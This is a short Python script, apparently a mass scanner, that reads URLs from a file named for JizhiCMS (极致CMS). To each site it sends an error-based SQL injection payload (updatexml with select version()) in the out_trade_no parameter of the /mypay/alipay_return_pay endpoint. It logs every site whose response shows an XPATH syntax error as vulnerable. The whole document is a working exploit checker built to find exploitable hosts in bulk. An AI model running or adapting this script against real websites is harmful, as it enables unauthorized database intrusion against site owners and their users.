import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("极致CMS.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.get(url+"/mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+", headers=headers, verify=False, timeout=5)
        if ("XPATH syntax error" in jiaoyan.text):
            with open("极致CMS sql注入 vul.txt", "a+") as f:
                f.write(url+"\n")
    except:
        continue

